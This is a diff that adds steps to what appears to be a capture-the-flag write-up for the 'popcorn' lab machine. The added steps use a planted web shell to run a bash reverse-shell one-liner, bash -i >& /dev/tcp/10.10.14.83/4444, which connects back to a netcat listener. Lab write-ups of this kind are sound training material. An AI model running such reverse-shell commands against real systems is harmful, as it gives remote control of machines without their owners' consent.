@@ -165,8 +165,18 @@ layout: default
     <br>
     <br>
 
-    <li>Seeing that it works, I know set the command to "</li>
+    <li>Seeing that it works, I now set a netcat listener on port 4444.  Then I intercept a web request to the web shell and set the command to bash -c 'bash -i >& /dev/tcp/10.10.14.83/4444 0>&1'.  I url encode this by highlighting the command and pressing ctrl + u.</li>
 
+    <img src="../images/popcorn/shell_request.png">
+
+    <br>
+    <br>
+
+    <li>My netcat receives a connection and I now have my reverse shell.</li>
+
+    <img src="../images/popcorn/reverse_shell.png">
+
+    
 
     
     
